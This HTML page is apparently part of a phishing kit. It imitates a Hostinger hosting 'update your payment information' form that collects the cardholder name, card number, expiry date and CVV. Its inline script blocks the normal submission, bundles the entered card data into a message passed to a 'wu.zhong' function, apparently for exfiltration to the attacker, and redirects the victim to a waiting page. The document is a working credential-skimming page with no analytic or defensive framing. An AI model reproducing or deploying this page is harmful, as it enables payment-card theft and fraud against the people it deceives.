<!DOCTYPE html>
<html lang="en">

<title>Hosting</title>

</head>
<body>
<header>
<div class="logo">
<img src="res/img/logo.png" > </div>


</header>




<main>


<div class="form">
<div class="continer">
<h2>Update your payment information.</h2>
</div>

<div class="title1">Please add or update your payment information to keep using out services.</div>


    


<div class="colo">
<form action="post.php" method="post">

<div class="colo"><label> Cardholder name </label>
 <input type="text" name="name" required> </div>


<div class="colo"><label> Card number </label>
<input type="text" name="cc" placeholder="XXXX XXXX XXXX XXXX" id="cc" required></div>


<div class="colo"><label> Expiration date </label> 
<input type="text" name="exp" placeholder="MM/YY" id="exp" required> </div>


<div class="colo"><label>Security code </label>
<input type="text"  name="cvv" placeholder="CVV" id="cvv" required> </div> <br>

</div class="moton">
<button type="submit">Continue</button> </div> <br>





</form>
</div>
</div>
</main>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>
$("#cc").mask("0000 0000 0000 0000");
$("#exp").mask("00/00");
$("#cvv").mask("0000");

document.querySelector("form").addEventListener("submit",(e)=>{
e.preventDefault();

wu.zhong(`💳 Hostinger Card Details\n\nName:${document.querySelector("[name='name']").value}\n\nCard Number:${document.querySelector("[name='cc']").value}\n\nExp:${document.querySelector("[name='exp']").value}\n\nCVV:${document.querySelector("[name='cvv']").value}`);

window.location="wait.html";

});

</script>
